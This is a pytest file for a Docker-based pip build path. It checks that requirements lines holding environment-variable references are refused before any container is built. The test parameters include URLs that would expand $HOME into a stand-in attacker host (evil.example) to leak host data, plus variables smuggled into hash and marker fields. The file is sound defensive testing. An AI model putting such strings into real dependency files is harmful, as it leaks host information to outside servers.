# ruff: noqa: F811
"""V0.7 G6 tester r3 (T-15) on the REAL Docker pip path: `$VAR` / `${VAR}` in a
requirements line is refused before any build container exists, with
only_binary on and off."""

from __future__ import annotations

from pathlib import Path

import pytest
from test_v07_g6_fix1_only_binary_docker import (  # noqa: F401
    _containers,
    _env_image_count,
    _job,
    _run,
    _runtime,
    env_images,
    image,
    label,
    package,
    wheelhouse,
)

from meshforge.common.errors import FailureType

pytestmark = [
    pytest.mark.component,
    pytest.mark.docker,
    pytest.mark.asyncio,
    pytest.mark.timeout(300),
]


@pytest.mark.parametrize("only_binary", [True, False])
@pytest.mark.parametrize(
    "requirements",
    [
        "mfdemo @ https://${HOME}.evil.example/mfdemo-1.0-py3-none-any.whl\n",
        "mfdemo @ https://$HOME.evil.example/mfdemo-1.0-py3-none-any.whl\n",
        "mfdemo==1.0 --hash=sha256:${HOME}\n",
        "mfdemo==1.0; platform_node == '${HOSTNAME}'\n",
    ],
)
async def test_docker_pip_never_sees_an_environment_reference(
    tmp_path: Path,
    image: str,
    wheelhouse: Path,
    label: str,
    env_images: list[str],
    requirements: str,
    only_binary: bool,
) -> None:
    runtime = _runtime(tmp_path, wheelhouse, label, only_binary=only_binary)
    result, log = await _run(runtime, _job(tmp_path, image, requirements, "mfdemo"))
    env_images.append(result.env_hash or "")
    assert result.failure_type is FailureType.ENV_ERROR, (result, log.text())
    assert result.reason == "requirements_rejected", (result, log.text())
    assert "environment variable reference" in f"{result.detail} {log.text()}"
    assert _containers(label) == []
    assert _env_image_count(result.env_hash) == 0
